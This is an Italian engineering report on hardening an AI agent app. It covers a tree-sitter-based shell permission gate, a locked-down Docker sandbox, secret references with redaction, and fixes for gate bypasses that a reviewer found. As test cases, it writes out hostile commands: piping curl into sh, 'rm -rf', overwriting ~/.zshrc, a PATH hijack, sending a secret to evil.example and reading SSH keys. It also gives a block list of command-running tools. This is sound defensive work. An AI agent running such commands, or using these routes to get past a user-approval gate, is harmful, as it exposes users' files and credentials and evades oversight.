# REPORT — Fase 1: sicurezza e correttezza

**Data:** 2026-10-26 · **Commit:** `fase 1: sicurezza e correttezza` · **Tag:** `fase-1`
**Scope:** correzione delle falle §5.1–5.7 del report di audit (§3.2 = architettura loop/permessi/sandbox cui i fix si applicano).
**Verifica:** `npm test` → **73 test, 8 file, tutti verdi** · `npm run typecheck` pulito · `npm run build` verde.
**Aggiornato dopo review:** commit `fase 1: correzioni review` (tag `fase-1` spostato) — bypass del gate corretti,
114 test verdi; vedi la sezione **«Correzioni review»** in fondo.

---

## 1A — Gate dei permessi shell (§5.1)

**Prima.** `targetKey('run-command')` prendeva la prima parola della riga (`git status; rm -rf /` → chiave `git`) e le standing grant facevano match per prefisso di stringa: una grant su `"rm"` autorizzava `rmdir`, `"git status"` autorizzava `git push`, e una pipeline con un secondo comando non approvato passava se la prima parola era coperta.

**Ora.**
- `src/main/agent/shell-ast.ts`: analisi reale della riga con **web-tree-sitter** + grammatica wasm **tree-sitter-bash** (wasm, non binding nativo: gira in dev, nei test in nodo puro e nell'app impacchettata senza rebuild di Electron).
  - `analyzeCommand(src)` → `{ commands: {name, sub?, argv}[], hasSubstitution, hasRedirectToFile, parseError }`. Estrae **ogni comando semplice** da pipeline, `;`, `&&`, `||`, subshell, `$(…)` e backtick. `sub` = primo argomento non-flag, solo per git/npm/docker/kubectl/brew/pnpm/yarn/cargo/go.
  - **Risoluzione dei .wasm (scelta documentata):** ① env `SANDBOT_WASM_DIR` → ② `<process.resourcesPath>/vendor` nella build impacchettata (electron-builder `extraResources`, riempita da `scripts/prepare-wasm.mjs` via `predist`) → ③ `<projectRoot>/vendor` in dev/test (`predev`/`pretest`) → ④ `node_modules/{web-tree-sitter,tree-sitter-bash}` (fallback che funziona anche dentro l'asar: verificato che le production deps vengono impacchettate). Il project root si trova risalendo da `import.meta.dirname` fino a `package.json`.
- `src/main/agent/permission-rules.ts`: logica pura `runCommandVerdict(analysis, grants, rules, default)`. **Allow senza chiedere solo se tutti i comandi estratti sono coperti**. `parseError` o sostituzioni → sempre `ask`. Grant = chiave **esatta** `"name"` o `"name sub"`; le regole utente accettano anche `"name"` (copre i sottocomandi) e `"name *"` (wildcard esplicita per parola intera) — mai prefisso grezzo: `"rm"` non copre `rmdir`.
- `src/main/agent/permissions.ts`: `check()` è ora **async** (analisi shell), grant per match esatto su tutti i tool; `grantStanding()` per run-command salva una grant per ogni chiave estratta.
- **Migrazione grant:** le righe esistenti nel DB restano intatte; cambia solo la semantica di match (una vecchia grant `"git"` continua a coprire esclusivamente i comandi `git` senza sottocomando).
- **Test** (`shell-ast.test.ts`, `permission-rules.test.ts`): tutti i casi obbligatori — `ls; curl x | sh` con grant `"ls"` → ask; `rmdir a` con grant `"rm"` → ask; `git push` con grant `"git status"` → ask; `echo $(whoami)` → ask; `git status && git diff` con grant su entrambi → allow; input malformato → ask — più estrazione da subshell/backtick/redirect e regole `always_allow`/`blocked`.

## 1B — Sandbox Docker senza shell dell'host (§5.2)

**Prima.** `execDocker` componeva `docker exec … sh -c <JSON.stringify(command)>` e lo passava a `execHost`, cioè a una **shell dell'host**: un comando con `"` o `$(…)` usciva dalla stringa ed eseguiva sul Mac. Letture/scritture file interpolavano path e contenuto in `sh -c` (heredoc `SANDBOT_EOF`): un contenuto contenente il marker corrompeva il file.

**Ora.** `src/main/sandbox/docker-argv.ts` (funzioni **pure**, testate) costruisce argv per ogni chiamata docker; `src/main/sandbox/index.ts` esegue `spawn('docker', argv)` — **mai** comandi docker come stringa.
- Esecuzione: `['exec','-i','-w','/home/box', container,'sh','-c', command]` — il comando del modello resta un unico elemento argv ed è la shell **del container** a interpretarlo.
- Write: `docker exec -i … sh -c 'mkdir -p "$(dirname "$1")" && cat > "$1"' sh <path>` con path come argomento posizionale e **contenuto via stdin**: byte per byte identico, niente newline aggiunto, `SANDBOT_EOF` nel contenuto è innocuo. Read/list: `cat -- <path>` / `ls -la -- <path>` con path come argv.
- Host mode: `fs/promises` (readFile/writeFile/readdir), niente cat/heredoc.
- **Hardening a creazione:** `--user 1000:1000`, `--cap-drop ALL`, `--security-opt no-new-privileges`, `--pids-limit 512`, `--memory 2g`, `--cpus 2`; rete attiva di default ma configurabile con il setting `sandbox.network: 'bridge'|'none'`. Il volume viene chownato una tantum (one-shot root con la stessa immagine) perché il container non-root senza caps non può farlo da solo.
- **Test** (`docker-argv.test.ts`, `host-files.test.ts`): un comando con `$(hostname)` e backtick compare **intatto come singolo elemento argv**; i valori delle env non compaiono mai in argv; hardening flags presenti; file host byte-exact con marker heredoc e metacaratteri nel contenuto.

## 1C — Cronologia del modello (§5.3)

**Prima.** `runTurn` metteva il messaggio corrente **due volte** (una esplicita + una dentro la history), `historyToMessages` tagliava a numero fisso di entry potendo lasciare un `tool` senza la sua chiamata (o viceversa), e le immagini viaggiavano su un messaggio dedicato.

**Ora.** `buildMessages(system, entries, currentImages, opts)` in `src/main/agent/history.ts` (puro, re-esportato da `loop.ts`):
- `[system, ...history]` in ordine cronologico; il messaggio corrente è l'ultimo entry del transcript → compare **una sola volta**; le immagini si attaccano all'**ultimo messaggio utente**.
- Taglio solo a **confine di turno** (suffix conservato parte da un messaggio utente), budget di 40 messaggi.
- Repair delle coppie: `tool-result` orfano → scartato; `tool-call` senza result (interrupt/taglio) → **result sintetico `"interrupted"`**.
- **Test** (`history.test.ts`): ordine, nessun duplicato, immagini sull'ultimo utente, taglio a confine di turno, nessuna coppia orfana, sintetico "interrupted".

## 1D — Tool call parallele (§5.4)

**Prima.** `openAiStream` leggeva solo `c.delta.tool_calls[0]`: una risposta con due tool call nel medesimo chunk ne perdeva una (chiamata mai eseguita → risposta del modello senza result).

**Ora.** Accumulatore puro `mergeToolCallDeltas(acc, deltas)` in `llm.ts`: itera **tutti** i delta del chunk accumulando per `index` (id impostato, nome/argomenti concatenati), ritorna ordinato per indice. **Test** (`llm-toolcalls.test.ts`): due call nello stesso chunk, argomenti frammentati su più chunk, due call frammentate in parallelo, index mancante.

## 1E — Segreti con riferimenti opachi (§5.6)

**Prima.** `read-credential` consegnava il valore **in chiaro al modello** (solo la UI vedeva la versione redatta) e la master key del vault veniva scritta nel Keychain con `security add-generic-password -w <chiave>` — chiave leggibile nell'argv del processo (`ps`).

**Ora.**
- Il tool `read-credential` **non esiste più**. Al suo posto `list-credentials` (solo i nomi, default `always_allow`). Il sistema prompt e la descrizione di `run-command` spiegano il meccanismo.
- Il modello scrive `{{secret:NOME}}` negli argomenti di `run-command`; `src/main/agent/secrets.ts` (puro) risolve i riferimenti **solo al momento dell'esecuzione**: valore iniettato come variabile d'ambiente `SANDBOT_SECRET_NOME` (in host: env dello spawn; in docker: `-e NOME` senza valore, ereditata dall'ambiente del processo docker) e comando riscritto per usare `$SANDBOT_SECRET_NOME`. Nome inesistente → errore con l'elenco dei nomi disponibili, nessuna esecuzione.
- `redactSecrets()` sostituisce il valore con `[redacted:NOME]` in stdout/stderr **prima** che l'output arrivi al modello o al transcript (un'unica versione redatta per entrambi).
- Master key in **electron safeStorage** (setting cifrato con la chiave di sistema). **Migrazione:** se esiste la chiave Keychain legacy viene letta con `find-generic-password` (il valore non passa dall'argv), riportata in safeStorage e **eliminata** dal Keychain.
- **Test** (`secrets.test.ts` + integrazione in `loop.test.ts` con LLM finto, vault e sandbox mockati): il valore non compare mai nei messaggi passati all'LLM né nel contenuto di alcuna entry del transcript; al modello arriva `[redacted:API_KEY]`; la chiamata nel transcript resta opaca (`{{secret:API_KEY}}`).

## 1F — Concorrenza (§5.7)

**Prima.** Ogni `runTurn` sovrascriveva `running.set(agentId, …)`: due turni simultanei sullo stesso agente → il primo perdeva interrupt/approval-resolver, notice e stati sovrapposti.

**Ora.** `loop.ts`: **un turno per agente + una coda per agente**.
- `running.set` avviene solo quando non c'è un run in corso (`running.has` → coda/scarto, check sincrono: nessuna race in JS single-thread).
- Messaggio utente su agente occupato → **accodato** (FIFO, tetto 10 con notice "Coda piena"); **routine** su agente occupato → **scartata con notice** (`routines.ts` passa `source: 'routine'`).
- A fine turno (`finally`) parte il prossimo turno in coda. `running` non viene mai sovrascritta.
- **Test** (`loop.test.ts`, LLM finto con stream "gated"): il secondo messaggio gira **dopo** il primo con ordine cronologico corretto e storia giusta; la routine occupata produce solo la notice; tetto coda rispettato.

---

## File cambiati/aggiunti

| File | Modifica |
|---|---|
| `src/main/agent/shell-ast.ts` | **nuovo** — analisi bash via tree-sitter wasm + risoluzione .wasm |
| `src/main/agent/permission-rules.ts` | chiavi esatte, `runCommandVerdict`, `commandRuleMatches` |
| `src/main/agent/permissions.ts` | `check` async, grant esatte, `grantStanding` multi-chiave |
| `src/main/sandbox/docker-argv.ts` | **nuovo** — argv builder puri + hardening |
| `src/main/sandbox/index.ts` | spawn argv senza shell, file op sicure, env, rete configurabile |
| `src/main/agent/history.ts` | **nuovo** — `buildMessages` puro (taglio a turno, repair coppie) |
| `src/main/agent/llm.ts` | `mergeToolCallDeltas` (tutti i delta, per index) |
| `src/main/agent/secrets.ts` | **nuovo** — `{{secret:NOME}}` → env, redazione |
| `src/main/agent/tools.ts` | `list-credentials`, run-command con risoluzione+redazione |
| `src/main/agent/loop.ts` | buildMessages, check async, coda per agente, running mai sovrascritto |
| `src/main/vault.ts` | safeStorage + migrazione Keychain (argv puliti) |
| `src/main/routines.ts` | `source: 'routine'` |
| `src/main/agent/prompts.ts`, `src/main/store/db.ts`, `src/renderer/.../Settings.tsx`, `README.md` | prompt/regole/UI/docs allineate |
| `scripts/prepare-wasm.mjs`, `package.json` | copia wasm in `vendor/`, script pre*, `extraResources` |
| `src/main/agent/__tests__/`, `src/main/sandbox/__tests__/` | 8 file di test (73 test) |

## Note e limitazioni

- Le grant vecchie nel DB **non** vengono migrate: la semantica esatta le rende semplicemente più strette (una grant `"git"` copre solo `git` senza sottocomando). L'utente può ri-concedere "Always" per le chiavi nuove.
- `sub` è euristico per costruzione ("primo argomento non-flag"): `git -C repo status` produce la chiave `git repo` → chiede approvazione. È il verso sicuro (mai un allow involontario).
- La rete del container resta attiva di default (`bridge`) come richiesto; isolamento totale con setting `sandbox.network: 'none'`.
- Il backend docker richiede Docker in esecuzione; gli argv e le operazioni host sono testati, il percorso container è verificato a livello di costruzione (funzioni pure) senza avviare Docker nei test.

---

# Correzioni review

Un revisore ha verificato la fase 1: il resto è corretto, ma il gate dei permessi
aveva **bypass dimostrati** (con una grant sul nome del comando, `runCommandVerdict`
rispondeva `allow`). Corretti i cinque punti sotto, senza toccare altro. Tutti i
bypass hanno un test che fallisce sul codice del tag `fase-1` originale e passa ora
(verificato eseguendo i nuovi test in un worktree sul tag: 30 fallimenti pre-fix).

## C1 — Comandi che eseguono altri comandi (never-auto)

Con una grant su `find`, `xargs`, `env`, `sudo`, `bash`, `eval` o `python3`
passavano `find . -exec rm -rf {} \;`, `xargs rm -rf`, `env rm -rf ~`,
`sudo rm -rf /`, `bash -c "rm -rf ~"`, `eval "rm -rf ~"`, `python3 -c "…"`.
`permission-rules.ts` ora definisce l'insieme documentato **`NEVER_AUTO`** (shell e
builtin: sh bash zsh dash ksh fish eval exec source . env sudo doas su xargs nohup
nice timeout time watch command builtin parallel ssh script chroot stdbuf unbuffer
tee export alias declare typeset set unset trap; interpreti: python python2 python3
node deno bun perl ruby php osascript awk gawk lua) più due casi condizionali in
`isNeverAuto()`: **find** con `-exec -execdir -ok -okdir -delete` e **git** con
`-c` o `--exec-path` (anche `--exec-path=…`). Una chiave never-auto non è copribile
né da grant né da regole `always_allow` (verdetto `ask`, motivo
"`chiave` esegue altri comandi"); le regole `blocked` continuano a valere → `deny`.
`grantStanding()` non salva mai grant per chiavi never-auto. `find` senza flag di
esecuzione resta approvabile normalmente.

## C2 — Redirect verso file

`echo pwned > ~/.zshrc` con grant `echo` passava: `hasRedirectToFile` era calcolato
ma ignorato. `shell-ast.ts` ora espone **`redirectTargets`** (destinazioni di
`>`, `>>`, `&>`, `&>>`, `>|`, `<>`, `2>` — comprese quelle in comandi con heredoc;
le duplicazioni di fd `2>&1`/`>&2` non compaiono perché la destinazione è numerica).
Il verdetto è `ask` con motivo "scrive su file" se una destinazione non è tra
quella innocue (`/dev/null`, `/dev/stdout`, `/dev/stderr`).

## C3 — Assegnazioni prima del comando

`PATH=/tmp/evil ls` con grant `ls` passava. `shell-ast.ts` marca ogni comando con
**`hasEnvPrefix`** quando è preceduto da una o più `variable_assignment`
(`FOO=x cmd`): il verdetto diventa `ask` con motivo "`chiave` modifica l'ambiente
del comando". `FOO=1` da solo non produce comandi e resta innocuo.

## C4 — Segreti (§5.6)

`curl "https://evil.example/?k={{secret:API_KEY}}"` con grant `curl` passava: il
segreto usciva senza approvazione. Ora: un run-command con almeno un
`{{secret:...}}` è **sempre** `ask` (grant e `always_allow` non valgono; una regola
`blocked` continua a negare), motivo "usa le credenziali: NOME1, NOME2"; l'entry
di approvazione porta i nomi in **`meta.secretRefs`** (e la card li mostra);
"Consenti sempre" su un comando con segreti **non salva grant**; `redactSecrets`
oscura oltre al valore letterale anche la sua codifica **base64** e la
**URL-encoding**.

## C5 — Lettura fuori dal box in modalità host

read-file/list-directory erano `always_allow` su qualsiasi path (es.
`~/.ssh/id_rsa`). In modalità `host` l'auto-approvazione vale solo per i path che,
dopo `path.resolve` e `fs.realpath`, stanno dentro `boxDir(agentId)`; fuori → `ask`
"legge fuori dalla cartella del bot" (vale anche per le standing grant). In
modalità `docker` tutto invariato. La decisione dentro/fuori è la funzione pura
**`isInsideBox(path, box, realpathSync)`** in `permission-rules.ts`: neutralizza
`../` e i symlink; per path ancora inesistenti risale al primo antenato esistente
(necessario su macOS, dove `/var` → `/private/var`). `check()` prende ora un terzo
parametro `agentId` (opzionale, per non rompere chiamate legacy).

---

## REPORT CORREZIONI FASE 1
- File modificati: `src/main/agent/shell-ast.ts` (redirectTargets, hasEnvPrefix, secretRefs nell'analisi), `src/main/agent/permission-rules.ts` (NEVER_AUTO, isNeverAuto, isInsideBox, runCommandVerdict), `src/main/agent/permissions.ts` (check con agentId, gate C5, secretRefs nel Verdict, filtri in grantStanding), `src/main/agent/loop.ts` (passa agentId, meta.secretRefs sull'entry approval), `src/main/agent/secrets.ts` (redazione base64/URL-encoding), `src/renderer/src/components/ApprovalCard.tsx` (riga "Credenziali usate" da meta.secretRefs), test: `permission-rules.test.ts`, `shell-ast.test.ts`, `secrets.test.ts`, `loop.test.ts` aggiornati + nuovo `permissions.test.ts`; `REPORT.md`.
- Decisioni: (1) l'ordine di priorità nel verdetto è parseError → sostituzione → `blocked` (deny, vince su tutto) → segreti (ask) → never-auto/assegnazioni/grant/regole → redirect su file, così una regola `blocked` resta valida anche per i never-auto; (2) una chiave è never-auto se ALMENO un comando con quella chiave lo è (`find . -name x; find . -exec rm {} \;` non concederebbe `find`); (3) il gate C5 in host taglia anche le standing grant, non solo `always_allow`; (4) i due test §5.6 del loop sono stati adattati alla nuova semantica (il comando con segreto ora passa dall'approvazione) e verificano anche il non-salvataggio della grant; (5) `--exec-path=VALORE` è trattato come `--exec-path`; (6) i never-auto salvano comunque le chiavi pulite della stessa riga (es. `ls; bash -c x` concede solo `ls`), coerentemente con la semantica multi-chiave della fase 1.
- Output typecheck/vitest/build: `npm run typecheck` pulito; `npx vitest run` → **114 test, 9 file, tutti verdi** (73 pre-fase + 41 nuovi; i soli 73 originali restano verdi); `npm run build` verde (preload 2.51 kB, renderer 1.178 kB). Verifica pre-fix: i nuovi test eseguiti sul tag `fase-1` (worktree) → 30 fallimenti, tutti i bypass C1–C5 confermati `allow`.
- Non verificato: il percorso Electron impacchettato (dist/dmg) e il backend docker in esecuzione reale (come nella fase 1: argv e logica verificati a livello di funzioni pure); il rendering visivo della ApprovalCard (riga credenziali) non ispezionato a schermo.
- Fuori scope notati: (1) `write-file` in host non ha il gate C5 (è `needs_approval` di default, quindi chiede comunque, ma una regola `always_allow` su write-file varrebbe anche fuori dal box); (2) la redazione dei segreti copre letterale/base64/URL-encoding ma non altre codifiche (hex, ROT13, reversed); (3) `hasEnvPrefix` non copre `export` usato come comando standalone (comunque never-auto via NEVER_AUTO); (4) le grant run-command restano salvate per chiavi con redirect su file o assegnazioni (il gate le chiede comunque ogni volta, ma il DB accumera grant inutilizzate); (5) `command <(cmd)` (process substitution) è già coperto da `hasSubstitution` → ask, ma `|&` (pipe stderr) non ha trattamento dedicato (equivale a una pipe normale).
